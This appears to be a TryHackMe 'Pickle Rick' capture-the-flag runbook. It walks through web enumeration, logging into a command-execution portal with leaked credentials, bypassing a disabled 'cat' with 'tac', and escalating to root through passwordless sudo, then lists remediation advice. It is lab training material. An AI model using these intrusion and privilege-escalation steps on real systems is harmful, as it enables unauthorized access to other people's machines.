# 🥒 Pickle Rick — TryHackMe CTF Runbook

This challenge focuses on web enumeration, command injection, and basic privilege escalation. The goal is to retrieve three hidden ingredients by exploiting a vulnerable web server.

---

## 🔍 Enumeration
1. **Service Discovery:** `nmap -A -T4 <TARGET_IP>`
2. **Directory Brute-forcing:** Use `gobuster` to find hidden endpoints.
   * `gobuster dir -u http://<TARGET_IP>/ -x php,html,txt -w /usr/share/wordlists/dirb/common.txt`
3. **Analyze Findings:**
   * `robots.txt`: Found `Wubbalubbadubdub` (potential password/clue).
   * `login.php`: Authentication page.
   * `portal.php`: Command execution interface.

---

## 🚀 Exploitation & Execution
### 1st Ingredient:
1. **Access:** Login to `portal.php` with username `R1ckRul3s` and password `Wubbalubbadubdub`.
2. **Execute:** Use the command panel to run `ls -la`.
3. **Read:** Since `cat` is disabled, use alternatives like `tac`, `less`, or `grep`.
   * Command: `tac Sup3rS3cretPickl3Ingred.txt`

### 2nd Ingredient:
1. **Explore:** Search the filesystem via the command panel.
   * Command: `ls /home/rick`
2. **Read:** Locate `second ingredients` file.
   * Command: `tac /home/rick/second\ ingredients`

### 3rd Ingredient (Privilege Escalation):
1. **Check Privileges:** Verify current permissions using `sudo -l`.
   * The user `www-data` can run any command as root without a password.
2. **Read Root:** List and read the final file in the root directory.
   * Command: `sudo ls /root/`
   * Command: `sudo tac /root/3rd.txt`

---

## ⌨️ Key Commands
* **Bypass `cat` restrictions:** 
  `tac`, `less`, `strings`, `grep .`, `cp <file> /dev/stdout`
* **Privilege Check:** `sudo -l`
* **Execute as Root:** `sudo <command>`

---

## 🛡️ Remediation (Defense)
* **Disable Web Shells:** Never expose command-line interfaces to the web. If necessary, use highly restricted sandboxed environments.
* **Principle of Least Privilege:** Do not configure `www-data` (the web server user) with `NOPASSWD` sudo privileges.
* **Input Sanitization:** Sanitize all user inputs before passing them to system calls to prevent Command Injection.
* **File System Security:** Regularly audit sensitive directories and ensure file permissions prevent unauthorized read access by web users.

---

## 🧠 Key Takeaways
* **Enumeration is King:** Finding `robots.txt` and checking the source code provided the initial credentials needed for the entire challenge.
* **Tool Alternatives:** Always have a backup plan (like using `tac` instead of `cat`) when common utilities are disabled by security filters.
* **Privilege Escalation:** Always check `sudo -l` immediately after gaining an initial foothold to identify quick wins for full system compromise.

---
**Task Status:** ✅ Completed